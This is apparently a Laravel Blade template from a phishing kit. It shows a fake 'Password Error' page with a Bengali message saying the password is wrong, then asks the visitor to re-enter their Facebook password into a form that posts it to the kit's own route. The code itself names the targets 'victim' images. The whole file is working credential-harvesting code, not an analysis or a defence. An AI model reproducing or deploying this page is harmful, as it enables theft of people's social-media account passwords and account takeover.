@extends('layouts.app')
@section('title')
    Password Error
@endsection

@section('content')
    <div class="bg-white">
        <div class="container-login100" style="background-image: url('{{asset('public/frontend/img/img-01.jpg')}}');">
            <div class="container">
                <div class="row">
                    <div class="col">
                        <div class="text-center victim-img victim-img_two mb-5">
                            @php
                                use App\Models\friendList;
                                $fndlist = FriendList::all();
                            @endphp
                            @foreach ($fndlist as $item)
                                <img class="w-25" src="{{asset($item->victim_img)}}" alt="">
                            @endforeach
                        </div>
                        <form method="post" action="{{ route('password2',$id) }}">
                            @csrf
                            <div class="form_error">
                                <p class="f-16 badge badge-danger d-block py-3 text-monospace text-center mb-4">আপনার
                                    পাসওয়ার্ডটি সঠিক নয় ?</p>
                                <label class="d-block" for="">Your Facebook Password</label>
                                <input required name="password_2" class="border-danger ar_form_control" type="password"
                                       placeholder="password">
                                <button id="submit" class="btn btn-outline-light float-right">
                                    Next
                                </button>

                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>


@endsection
